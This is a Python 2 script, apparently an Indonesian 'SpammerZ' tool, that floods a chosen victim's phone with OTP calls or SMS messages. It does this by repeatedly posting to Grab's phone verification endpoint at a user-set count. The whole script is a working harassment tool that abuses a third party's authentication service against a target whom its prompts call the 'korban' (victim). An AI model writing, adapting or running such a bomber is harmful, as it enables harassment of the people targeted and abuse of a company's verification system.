import os, time, sys
try:
    import requests
except ImportError:
    os.system('reset')
    rqs = raw_input('\x1b[1;91m[+] \x1b[1;92mPerlu install requests \x1b[1;97m(y/t): ')
    if rqs == '':
        print '\x1b[1;91m[!] Jangan kosong'
        os.sys.exit()
    elif rqs == 'y':
        os.system('pip2 install requests')
        exit()
    elif rqs == 'Y':
        os.system('pip2 install requests')
        exit()
    elif rqs == 't':
        os.sys.exit()
    elif rqs == 'T':
        os.sys.exit()
    else:
        print '\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)'
        time.sleep(1)
        os.sys.exit()

logo = '\x1b[1;97m\n  __i\n |---| \x1b[1;96mSAMSUNG\x1b[1;97m\n |[_]|    \n |:::|    \n |:::|    \x1b[1;93m* \x1b[1;97mAuthor \x1b[1;91m: \x1b[1;96mZeDD\x1b[1;97m\n `\\   \\   \x1b[1;93m* \x1b[1;97mTools  \x1b[1;91m: \x1b[1;96mSpammerZ \x1b[1;93mv0.1\x1b[1;97m\n   \\_=_\\  \x1b[1;93m* \x1b[1;97mGitHub \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m'

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def selesai():
    print '\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu()


def menu():
    os.system('reset')
    print logo
    print 48 * '\x1b[1;97m='
    print '\x1b[1;91m1.\x1b[1;97m CALL (\x1b[1;92mgrab\x1b[1;97m)'
    print '\x1b[1;91m2.\x1b[1;97m SMS (\x1b[1;92mgrab\x1b[1;97m)'
    print '\x1b[1;91m0. Keluar'
    print
    pek()


def pek():
    pilih = raw_input('\x1b[1;91m[+] \x1b[1;92mPILIH \x1b[1;91m:\x1b[1;97m ')
    if pilih == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pek()
    elif pilih == '1':
        call()
        selesai()
    elif pilih == '2':
        sms()
        selesai()
    elif pilih == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + pilih + ' \x1b[1;91mTidak ada'
        pek()


def call():
    os.system('reset')
    print logo
    print 48 * '\x1b[1;97m='
    print '\x1b[1;97mExt\x1b[1;91m: \x1b[1;93m62xxxxxxxxxxxx   \x1b[1;97mCTRL+C \x1b[1;91mexit'
    print
    nomerc = raw_input('\x1b[1;91m[+] \x1b[1;92mNomor korban \x1b[1;91m:\x1b[1;97m ')
    try:
        jumlah = int(raw_input('\x1b[1;91m[+] \x1b[1;92mJumlah \x1b[1;91m: \x1b[1;97m'))
    except ValueError:
        print '\x1b[1;91m[!] Terjadi kesalahan'
        keluar()
    else:
        datac = {'method': 'CALL', 'countryCode': 'id', 'phoneNumber': nomerc, 'templateID': 'pax_android_production'}
        try:
            jalan('\x1b[1;91m[+] \x1b[1;92mMulai\x1b[1;91m ...')
            print 48 * '\x1b[1;97m='
            for z in range(jumlah):
                rc = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=datac)
                asuc = str(rc.text)
                if 'challengeID' in asuc:
                    print '\x1b[1;91m[\x1b[1;97m' + str(z) + '\x1b[1;91m] \x1b[1;97mTerkirim \x1b[1;91m:\x1b[1;96m ' + nomerc
                else:
                    print '\x1b[1;91m[\x1b[1;97m' + str(z) + '\x1b[1;91m] Gagal \x1b[1;91m: ' + nomerc
                time.sleep(35)

        except KeyboardInterrupt:
            keluar()


def sms():
    os.system('reset')
    print logo
    print 48 * '\x1b[1;97m='
    print '\x1b[1;97mExt\x1b[1;91m: \x1b[1;93m62xxxxxxxxxxxx   \x1b[1;97mCTRL+C \x1b[1;91mexit'
    print
    nomers = raw_input('\x1b[1;91m[+] \x1b[1;92mNomor korban \x1b[1;91m:\x1b[1;97m ')
    try:
        jumlah = int(raw_input('\x1b[1;91m[+] \x1b[1;92mJumlah \x1b[1;91m: \x1b[1;97m'))
    except ValueError:
        print '\x1b[1;91m[!] Terjadi kesalahan'
        keluar()
    else:
        datas = {'method': 'SMS', 'countryCode': 'id', 'phoneNumber': nomers, 'templateID': 'pax_android_production'}
        try:
            jalan('\x1b[1;91m[+] \x1b[1;92mMulai\x1b[1;91m ...')
            print 48 * '\x1b[1;97m='
            for s in range(jumlah):
                rs = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=datas)
                asus = str(rs.text)
                if 'challengeID' in asus:
                    print '\x1b[1;91m[\x1b[1;97m' + str(s) + '\x1b[1;91m] \x1b[1;97mTerkirim \x1b[1;91m:\x1b[1;96m ' + nomers
                else:
                    print '\x1b[1;91m[\x1b[1;97m' + str(s) + '\x1b[1;91m] Gagal \x1b[1;91m: ' + nomers
                time.sleep(35)

        except KeyboardInterrupt:
            keluar()


if __name__ == '__main__':
    menu()
